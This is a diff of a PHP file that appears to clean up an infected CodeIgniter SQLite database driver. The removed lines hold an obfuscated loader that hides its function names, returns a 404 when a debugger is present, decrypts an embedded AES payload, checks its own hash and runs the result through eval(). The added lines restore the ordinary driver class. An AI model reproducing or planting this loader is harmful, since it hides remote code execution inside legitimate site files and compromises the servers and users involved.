@@ -1,28 +1,287 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_yyqrqevs=('bas'.'e64'.'_de'.'cod'.'e');
-$_mdpkgtrz=('gzu'.'nco'.'mpr'.'ess');
-$_gn7sct75=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_rlrd2sw6='UAys8cKY';
-$_at0d6rr0='qn00dmLl';
-$_jf5x4bqb='gfT1mdYS';
-$_kklz7txk='byGtcy2U2AE=';
-$_tke66lwt='GScz6tua';
-$_brs821tk='GAOg9sT7';
-$_femtfsy5='cZvhCcHM';
-$_hl6qx9na='VMcE8A==';
-$_sy291dnd=$_yyqrqevs($_tke66lwt.$_rlrd2sw6.$_at0d6rr0.$_jf5x4bqb.$_kklz7txk);
-$_ia2df47j=$_yyqrqevs($_brs821tk.$_femtfsy5.$_hl6qx9na);
-$_kn9audpa=$_yyqrqevs('KRzKEDNspOlj85XwxZUB5xGoqVjnDMK/7rQd3ZvzjRWf21mO1zaOwvFvnMkEvMF8/qXmQZNZY4Ky0uQzWW55dHn6GLzbh4K3hidBC+olcWS0M5FGIrkvs6IObcynQjBPaFlj7cCswlXjVaj0FNw6hoUvgdfL09g02iugMrZtOPJ6M3bB41J961p6Jc4AuGHBseRYGY0hmfQaLaPdwcqeonXhOaoSAvnZdCQ0wNgdgLXueMHrz2XVa618I04TL9iyOn7QFbu0axh3K/tjEbbkdJUsr3lQC/BzhUhA7ObrgtkJ7EvLlylbFhtffaoBQ7XbOQ2TvZB4909C1OS2qTh5tydRarEHJUU8W3254WRr4xVdyoLuP2VNXUKBMFG7iBKyToU2f4X3dmCW4PR9QExos0Y7ErA8BzYbIAytGTjvqkqmO97j3/PieW/omn8QHsJp894+925vBPqGL7uc5geK4Dq2XBQZnHRIRM62A0kHabcK/AV5UF+Fet2lmsXVCtqKSkdOtdNv1Yr3yktq/Dk0BGdOnbJ5a2hAjfc49sbvRvqWUjFVhBYUn+DGABOnDk2IQ8ezJFnFHAYrGGZE5T2csDN736d1F3aUpsiEC+T3ZDTpmGnPIbaiYb29FtRNGpAnxBKWRXzvKFE5GSPIubwXWchI2k4ViKi1QX3DkY01YQ5/E1yf5hRSct6Wm9Ef6OhUsmM7VSE2DkhaCZX6z/hCozjEoGetqgfmbJSID9CBeLIt60Kb/6jOaFIrFh8H5s7neouq59AlgS4VcslBYB7a1mCXRHGNBm5/DtRQ2vcPDrE0bJNJcZi2L8B7Ok/7UIo/RzQttKDVLU6JXeUhyYWc+LiVNAeOMX0SfQei+kiNiGvGdIBh6Aclr5wIYVC2JKGVU1PhkVUgPpsLeTYZ117SI86skpiR1smLUqn/ET0OpIMLYsA7UGBwkhzgfu5HgyGcMf3hyq3th8lJxkABe0fB9oekx4biln0HlyqsqsWmWiUIy2AOEGo5pCBK8AcNrO0vcj3JNlL57SUS8Dumaej3tm2GUXaezFv/wW90OAgAid09ImdbxjmR1DsU55UHn6v0hQIVco8zhKDF9s8THdK9fIRqk6h/HrpM3FUvkBoRzWZkpSpUq67YudogutQiubAisg1x3nYrgHType6VEGLPR71+XvvPKHyUAcGMfvf+BDcSPq+M0yHG5fmXhZOKJaq8DjAaIEif6vutz8ZkVn68xMJ1HNbltkm1mSTMQ0gctptbMcxdoI2a1N5w7DzBtuLOa6K+jjlUlCJ1B0yE0UdiRNdxoOoE1e1reVimsMZdkbsGFoBEbhapEdZW3wNKrBGLeOQtVamYQ5Es9iqMFQFwJZmLZmWN+cUmNRSNZYY08n2YDhrya6dDHBKHQQmgXB3a');
-$_h3oim0r6=$_gn7sct75($_kn9audpa,'aes-256-cbc',$_sy291dnd,OPENSSL_RAW_DATA,$_ia2df47j);
-if($_h3oim0r6===false){exit;}
-$_gnq7ig3v=$_mdpkgtrz($_h3oim0r6);
-if($_gnq7ig3v===false){exit;}
-$_vwtaqs2p='b81d1c1b7f28b0ae6466d3de642b1d734074069a1dc58df459ed8578ab11236d';
-$_h5jbmaza=@file_get_contents(__FILE__);
-if($_h5jbmaza!==false){
-$_wjkz18k4=str_replace($_vwtaqs2p,"0000000000000000000000000000000000000000000000000000000000000000",$_h5jbmaza);
-$_fnwvde3z=hash("sha256",$_wjkz18k4);
-if($_fnwvde3z!==$_vwtaqs2p){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+
+
+class CI_DB_sqlite_driver extends CI_DB {
+
+
+
+
+
+public $dbdriver = 'sqlite';
+
+
+
+
+
+
+protected $_random_keyword = array('RANDOM()', 'RANDOM()');
+
+
+
+
+
+
+
+public function db_connect($persistent = FALSE)
+{
+$error = NULL;
+$conn_id = ($persistent === TRUE)
+? sqlite_popen($this->database, 0666, $error)
+: sqlite_open($this->database, 0666, $error);
+isset($error) && log_message('error', $error);
+return $conn_id;
 }
-eval($_gnq7ig3v);
+
+
+
+
+
+
+public function version()
+{
+return isset($this->data_cache['version'])
+? $this->data_cache['version']
+: $this->data_cache['version'] = sqlite_libversion();
+}
+
+
+
+
+
+
+
+protected function _execute($sql)
+{
+return $this->is_write_type($sql)
+? sqlite_exec($this->conn_id, $sql)
+: sqlite_query($this->conn_id, $sql);
+}
+
+
+
+
+
+
+protected function _trans_begin()
+{
+return $this->simple_query('BEGIN TRANSACTION');
+}
+
+
+
+
+
+
+protected function _trans_commit()
+{
+return $this->simple_query('COMMIT');
+}
+
+
+
+
+
+
+protected function _trans_rollback()
+{
+return $this->simple_query('ROLLBACK');
+}
+
+
+
+
+
+
+
+protected function _escape_str($str)
+{
+return sqlite_escape_string($str);
+}
+
+
+
+
+
+
+public function affected_rows()
+{
+return sqlite_changes($this->conn_id);
+}
+
+
+
+
+
+
+public function insert_id()
+{
+return sqlite_last_insert_rowid($this->conn_id);
+}
+
+
+
+
+
+
+
+
+
+protected function _list_tables($prefix_limit = FALSE)
+{
+$sql = "SELECT name FROM sqlite_master WHERE type='table'";
+if ($prefix_limit !== FALSE && $this->dbprefix != '')
+{
+return $sql." AND 'name' LIKE '".$this->escape_like_str($this->dbprefix)."%' ".sprintf($this->_like_escape_str, $this->_like_escape_chr);
+}
+return $sql;
+}
+
+
+
+
+
+
+
+
+
+protected function _list_columns($table = '')
+{
+
+return FALSE;
+}
+
+
+
+
+
+
+
+public function field_data($table)
+{
+if (($query = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
+{
+return FALSE;
+}
+$query = $query->result_array();
+if (empty($query))
+{
+return FALSE;
+}
+$retval = array();
+for ($i = 0, $c = count($query); $i < $c; $i++)
+{
+$retval[$i] = new stdClass();
+$retval[$i]->name = $query[$i]['name'];
+$retval[$i]->type = $query[$i]['type'];
+$retval[$i]->max_length = NULL;
+$retval[$i]->default = $query[$i]['dflt_value'];
+$retval[$i]->primary_key = isset($query[$i]['pk']) ? (int) $query[$i]['pk'] : 0;
+}
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function error()
+{
+$error = array('code' => sqlite_last_error($this->conn_id));
+$error['message'] = sqlite_error_string($error['code']);
+return $error;
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _replace($table, $keys, $values)
+{
+return 'INSERT OR '.parent::_replace($table, $keys, $values);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _truncate($table)
+{
+return 'DELETE FROM '.$table;
+}
+
+
+
+
+
+
+protected function _close()
+{
+sqlite_close($this->conn_id);
+}
+}
